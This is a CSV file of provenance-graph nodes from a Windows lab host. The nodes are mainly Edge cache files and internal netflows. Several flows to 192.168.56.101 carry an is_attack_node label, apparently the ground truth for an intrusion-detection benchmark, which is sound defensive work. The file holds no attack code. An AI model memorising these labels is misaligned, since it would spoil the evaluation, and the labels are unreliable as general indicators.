uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
8e3c28de-c128-416b-9994-836fb412ac8b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab8e5be042409c8f_0'},568,False,1,0,1,1,0,1
cf68fb42-9144-4fdb-baa4-6b43bdffd12b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a35caf37911ffc68_0'},569,False,1,0,1,1,0,1
0dca8949-3b34-4611-a58f-079a4df54682,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a674423cfbfd17cb_0'},570,False,1,0,1,1,0,1
83a78ae8-ece6-4366-8ef4-ce4e3fd41185,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b03edf631539a03_0'},571,False,1,0,1,1,0,1
0a146406-c824-4414-aa43-98d7dd45c4d6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7b242180316745f3_0'},572,False,1,0,1,1,0,1
1630c6ae-f3db-4e8c-a14f-29ea4ae561ba,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f12d9bd42964b0e9_0'},573,False,1,0,1,1,0,1
caac7498-242c-41aa-a45b-a7084eaaa4c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a4eeb911b4b433aa_0'},574,False,1,0,1,1,0,1
1de630e9-1103-4721-a55b-348b1c8ed3af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\22d4a57ac4e23ec3_0'},575,False,1,0,1,1,0,1
47947113-7f63-4531-a111-ca7fc31a85e6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8c2129e90010758d_0'},576,False,1,0,1,1,0,1
98ef4b9f-571e-4ff7-a039-53f60ea95473,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\383a36fceaa62055_0'},577,False,1,0,1,1,0,1
d22f17b6-793c-442e-9355-0b065c56a83e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9e8aa4fdf814d5ed_0'},578,False,1,0,1,1,0,1
2fd444c2-14db-4277-b5ce-37a2d168c711,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3baf6e1cdce96d35_0'},579,False,1,0,1,1,0,1
4be789e5-988a-46ba-8600-1af6e0bb4aaa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f1b076f89f1cca1b_0'},580,False,1,0,1,1,0,1
0b425049-e182-4552-9ab7-a55051b4499d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b4f84b300748a114_0'},581,False,1,0,1,1,0,1
0b8d6927-71a6-426a-ada2-1b26c2de70ea,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5c14882e51891d25_0'},582,False,1,0,1,1,0,1
ea468e39-bf51-4d5b-9d5c-0edbda56cf79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\79f151d882f08df2_0'},583,False,1,0,1,1,0,1
f09125b4-3373-4c55-a349-a7a5367c8208,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4fce287b5b441d74_0'},584,False,1,0,1,1,0,1
9ab0b584-d81a-4ae5-96f8-74b25da6be0b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\10321e9873897921_0'},585,False,1,0,1,1,0,1
566a5e61-3de8-4993-a578-39f38a1b2737,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\040f11e49243b61d_0'},586,False,1,0,1,1,0,1
faf850a4-3517-4315-b815-e8e55fe51acf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a4f8d2c06f10a58b_0'},587,False,1,0,1,1,0,1
8aefc67f-df8b-46b7-b697-8423e1f86689,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dc4038e735155772_0'},588,False,1,0,1,1,0,1
4d50991c-d3cb-447a-80ba-2e82360df0d3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ccec3ded4220927_0'},589,False,1,0,1,1,0,1
339f379a-c81a-4a23-981a-0d66b332fb9b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\37dc59fa0fdce3a3_0'},590,False,1,0,1,1,0,1
f8ae4d69-bb6a-449c-b558-043516c54676,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a7'},591,False,1,0,1,1,0,1
300c8144-5d0c-45b4-9a86-e4ebb59fd534,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a2'},592,False,1,0,1,1,0,1
c50d0e19-965e-4679-b930-9611e66a3672,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000093'},593,False,1,0,1,1,0,1
5237e215-4235-4459-a5a7-f0a2b0a69c69,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b8'},594,False,1,0,1,1,0,1
51233166-c92b-4203-9c0b-83426fdd9a1a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000010'},595,False,1,0,1,1,0,1
3699ef7b-2858-43d1-9db1-2fc8e4fb5d50,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b9'},596,False,1,0,1,1,0,1
044f119d-4bfa-4fec-9bc2-bc41d6ba287d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000090'},611,False,1,0,1,1,0,1
3db08c65-c600-403f-873e-8c18cc8f3b21,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ba'},612,False,1,0,1,1,0,1
d5fcc014-15d7-460c-987c-0fea0a733a0b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a4'},773,False,1,0,1,1,0,1
4ca6a684-7aeb-4889-a5c8-2d1846e7bcc6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000082'},780,False,1,0,1,1,0,1
d9a2d1cc-152f-4381-bcc9-d1a0a907217d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bb'},781,False,1,0,1,1,0,1
0404b4b8-48e9-4b0e-a804-f125c7514d80,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_00009e'},782,False,1,0,1,1,0,1
cc36ee9c-670c-41c5-ada2-b9b446d40439,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000095'},783,False,1,0,1,1,0,1
ce6ae529-3f34-4942-9934-0b18d0b2a092,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bc'},784,False,1,0,1,1,0,1
ac087386-cc0d-4498-b21f-460c4ece45e7,{'netflow': '192.168.56.102:57292->192.168.56.101:16415'},807,True,1,0,1,1,0,1
c278791a-0ffd-409c-b23c-9c19c33d1c5d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\index'},808,False,1,0,1,1,0,1
23bfdf15-bf2d-4995-8025-a3634af00c37,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_0'},809,False,1,0,1,1,0,1
a15cedd5-d72a-48d4-9598-16017502df39,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_1'},810,False,1,0,1,1,0,1
67b0c957-eba4-400f-9959-0b2842b176ef,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_2'},811,False,1,0,1,1,0,1
93802d98-8eca-4877-ac3e-7714d86a3673,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_3'},812,False,1,0,1,1,0,1
4ef032da-0968-41a6-9e49-bb6dd3028fd8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\index'},813,False,1,0,1,1,0,1
cdf85d4b-f7b5-49e9-bd84-a3cdba663eb0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_0'},814,False,1,0,1,1,0,1
a6e953e2-63bc-4cce-b6e4-81119bd2c6d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_1'},815,False,1,0,1,1,0,1
ec0e65f6-b56e-42d6-a4dc-6c8b765c7bed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_2'},816,False,1,0,1,1,0,1
4853bc49-41d5-41c2-8d51-59830352ef0d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_3'},818,False,1,0,1,1,0,1
4c9fe465-d367-4b3f-93c7-f89db8dce430,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\index'},819,False,1,0,1,1,0,1
aa107bc2-016d-45ce-88ba-95bce4156dde,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_0'},820,False,1,0,1,1,0,1
ff37528a-0ffb-47f9-8f89-e9364abf3344,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_1'},821,False,1,0,1,1,0,1
a3017b11-5154-41e8-ae60-ab6a390cbcdd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_2'},822,False,1,0,1,1,0,1
d222cf13-5979-4be2-bd26-d124db50dc92,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_3'},823,False,1,0,1,1,0,1
eb5c9e70-a67d-4db4-874d-1c521d93a081,{'netflow': '192.168.56.102:57548->192.168.56.101:16415'},825,True,1,0,1,1,0,1
399d27d1-00ba-4b6f-ae9a-92663a006c3d,{'netflow': '192.168.56.102:57804->192.168.56.101:16415'},826,True,1,0,1,1,0,1
e54a2fdf-0cc6-4ff3-92b9-d5c288255068,{'netflow': '10.0.2.15:58316->20.96.153.111:47873'},828,False,1,0,1,1,0,1
858d4234-1db5-4ec8-a18d-4112c853f100,{'netflow': '10.0.2.15:58572->4.153.57.10:47873'},829,False,1,0,1,1,0,1
09d891b9-c0ae-49b0-a3ba-191bfa65f775,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local'},830,False,1,0,1,1,0,1
961b0900-f80e-4880-aee1-d30270174be7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\uriCache_'},831,False,1,0,1,1,0,1
14aaae88-4e09-467f-8d86-67bb36434dc3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\uriCache'},832,False,1,0,1,1,0,1
2aa858d8-5306-4464-9661-e0092bd75c7f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\ExtensionActivityEdge-journal'},833,False,1,0,1,1,0,1
534f6562-bebd-4ca0-b83e-b7dd9e66279d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shortcuts'},835,False,1,0,1,1,0,1
34c92837-4159-4276-ae01-f37ddf8bfc5a,{'file': 'C:\\Program Files (x86)\\desktop.ini'},836,False,1,0,1,1,0,1
f7fc746e-95cf-4884-a1e7-e6b0227bb798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Workspaces\\Logs\\Workspaces Internals Logs'},837,False,1,0,1,1,0,1
8d88d7e0-4200-4c74-bd48-84b43af33b78,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Crashpad\\settings.dat'},841,False,1,0,1,1,0,1
02df7474-846a-44d3-b293-b412ecd990e5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\favorites_diagnostic.log'},848,False,1,0,1,1,0,1
c2caa37d-2141-4069-8d7b-1e5c3d3aa01b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000013.log'},852,False,1,0,1,1,0,1
21d7c267-f4f0-43ad-af11-061b30f361a7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000014.ldb'},856,False,1,0,1,1,0,1
9f350c87-0dd3-4570-a1d6-b356fa4d65d0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000010.log'},857,False,1,0,1,1,0,1
4b7a972b-f0b7-4cc7-9417-afe6f2910ca2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\rainstart0[1].svg'},861,False,1,0,1,1,0,1
f7485dc6-43cf-4065-b20c-f1c1ec3ee6b6,{'netflow': '192.168.56.102:58828->192.168.56.101:16415'},864,True,1,0,1,1,0,1
5e74fbff-750d-40f6-8b84-d2c51c71f202,{'netflow': '192.168.56.102:59084->192.168.56.101:16415'},865,True,1,0,1,1,0,1
c8949b45-1db3-4e7a-80c0-cb681a65e654,{'netflow': '10.0.2.15:59340->13.89.179.9:47873'},868,False,1,0,1,1,0,1
87572acf-85a5-4863-a64a-1a4f9e7a0c0b,{'netflow': '192.168.56.102:59596->192.168.56.101:16415'},869,True,1,0,1,1,0,1
96df45e8-4238-4070-a847-6b6a0bf68a6d,{'netflow': '192.168.56.102:59852->192.168.56.101:16415'},870,True,1,0,1,1,0,1
ca32aa02-bf29-4de5-a3d7-1503ef3da758,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\ccba5a5986c77e43.automaticDestinations-ms'},875,False,1,0,1,1,0,1
7f9bd02b-e452-4828-aad7-c163b6ecb3c5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\HubApps Icons-journal'},882,False,1,0,1,1,0,1
0f48389e-9d9b-4906-914b-2446db77adfd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bd'},883,False,1,0,1,1,0,1
1149793c-9bb8-4061-bbbf-7fd6a16a3ddc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\downloadCache'},885,False,1,0,1,1,0,1
493cc955-bbe9-4ed4-9d84-d29b6bca060e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\downloadCache_'},886,False,1,0,1,1,0,1
8a7abeb8-96b0-49f8-9690-d2b310871274,{'netflow': '10.0.2.15:60108->40.118.171.167:47873'},887,False,1,0,1,1,0,1
1f976908-5bfd-4010-90dd-baa3ecc84c57,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Collections\\collectionsSQLite'},895,False,1,0,1,1,0,1
2d41d3d9-bcc4-4b52-9ba8-3d5c6f666a85,{'file': 'C:\\Users\\victim\\AppData\\Local\\IconCache.db'},901,False,1,0,1,1,0,1
04615005-6b48-4f46-9c77-a7651924850c,{'netflow': '10.0.2.15:60364->13.91.222.61:47873'},902,False,1,0,1,1,0,1
88f64c62-c11e-4370-988e-2e261f1faeb1,{'file': 'd:SmartScree'},903,False,1,0,1,1,0,1
c68c8c9e-8c2f-45fc-8f64-8cbdaf3fa09e,{'file': 'C:\\Windows\\System32\\ieframe.dll'},924,False,1,0,1,1,0,1
ad38fef2-28e7-4337-90dd-41431c2447c1,{'file': 'C:\\Program Files\\Windows Defender\\EppManifest.dll'},926,False,1,0,1,1,0,1
4242f8e4-9fbb-4340-a841-314075f39c68,{'file': 'C:\\Users\\victim\\3D Objects\\desktop.ini'},928,False,1,0,1,1,0,1
051d8daa-89d6-453d-b512-0f236f41bf80,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\CachedImage_1862_965_POS4.jpg'},937,False,1,0,1,1,0,1
03a67b1d-7bd4-4490-b06a-fd839a286210,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network Action Predictor-journal'},1708,False,1,0,1,1,0,1
e2d87308-31ff-45ca-9e41-d4cbcc18e382,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000015.db'},1711,False,1,0,1,1,0,1
b374c1e7-3a2c-4f88-ae8b-a1cfbd746ac1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000010.db'},1712,False,1,0,1,1,0,1
75dfaadf-8662-408f-bbb4-4d3e19706b50,{'netflow': '192.168.56.102:63692->192.168.56.101:53764'},1780,True,1,0,1,1,0,1
41a8f9f8-1442-499e-a37a-1ef92b09df14,{'netflow': '10.0.2.15:46284->2.21.9.40:47873'},1791,False,1,0,1,1,0,1
bb4d1e58-e44b-4ff2-a586-850b65e0b3d9,{'netflow': '10.0.2.15:63948->2.21.9.40:47873'},1792,False,1,0,1,1,0,1
15c3c7e5-4e71-4e59-a780-c7d1d058b40d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\eventbrief[1].svg'},1793,False,1,0,1,1,0,1
067b3595-ba97-4a28-b092-4c754a010b56,{'netflow': '10.0.2.15:52940->20.50.73.10:47873'},1794,False,1,0,1,1,0,1
d462c358-78e4-40b2-8bfc-a3fe2f2391b4,{'netflow': '10.0.2.15:53452->204.79.197.203:47873'},1799,False,1,0,1,1,0,1
80a1c52f-851c-435d-99ae-67e17da95797,{'netflow': '10.0.2.15:53964->20.50.73.10:47873'},1801,False,1,0,1,1,0,1
02ef15e7-9418-44bc-b144-ba9116a6f478,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shared Dictionary\\cache\\8013211cbe57f278_0'},1832,False,1,0,1,1,0,1
1004ebcb-28bc-4cd2-b902-a99ff2569cfe,{'netflow': '10.0.2.15:64460->20.42.65.84:47873'},1833,False,1,0,1,1,0,1
a0f4deeb-b266-47e9-a0e8-be7105be62f7,{'netflow': '192.168.56.102:64716->192.168.56.101:16415'},1834,True,1,0,1,1,0,1
9ed406b4-d9a4-4d6d-920f-96638b334ec7,{'netflow': '192.168.56.102:64972->192.168.56.101:16415'},1835,True,1,0,1,1,0,1
8c6c96a8-3cba-4066-a154-e43e5e9a20a8,{'netflow': '192.168.56.102:65228->192.168.56.101:16415'},1836,True,1,0,1,1,0,1
5e5d4e19-e000-4f43-894c-1d80213e7f82,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shortcuts-journal'},1837,False,1,0,1,1,0,1
d390e1c3-ab5d-41a1-8544-1f87b1301d72,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_01[1].svg'},1838,False,1,0,1,1,0,1
c715aecf-fc81-4a3f-83cb-7b46c21507b9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_18[1].svg'},1839,False,1,0,1,1,0,1
7f072df8-8ed0-4981-b4b0-2255a5187899,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_03[1].svg'},1840,False,1,0,1,1,0,1
d7eaf97a-d950-46e5-86aa-189ff03a7882,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_05[1].svg'},1841,False,1,0,1,1,0,1
038657f5-0683-4f02-96f9-421afe4e37b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_04[1].svg'},1842,False,1,0,1,1,0,1
8554c114-7246-49d7-91e9-92f5323236ef,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_23[1].svg'},1843,False,1,0,1,1,0,1
90690447-7dcd-44bd-8d13-27c91406878e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_08[1].svg'},1844,False,1,0,1,1,0,1
499fbc26-e6d6-405e-9219-adf6905ef898,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_07[1].svg'},1845,False,1,0,1,1,0,1
3fc4f357-3181-4d18-9615-4d4a1b449e7c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_09[1].svg'},1846,False,1,0,1,1,0,1
010d7a2b-95c0-40be-9ded-0bab2d113f97,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_10[1].svg'},1847,False,1,0,1,1,0,1
2036e4d2-e779-4e16-850d-176dc23406c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_13[1].svg'},1848,False,1,0,1,1,0,1
ca29cd3e-a615-42f0-8ec0-82154ae08013,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_12[1].svg'},1849,False,1,0,1,1,0,1
3c9e0c0b-6a74-4a1a-8b0b-b380c534227b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_11[1].svg'},1850,False,1,0,1,1,0,1
9bcb5b77-6e15-4b00-a1f7-4eccffcb3299,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_14[1].svg'},1851,False,1,0,1,1,0,1
2cf25f8a-0bcf-49b5-a60a-85b39d845b16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_02[1].svg'},1852,False,1,0,1,1,0,1
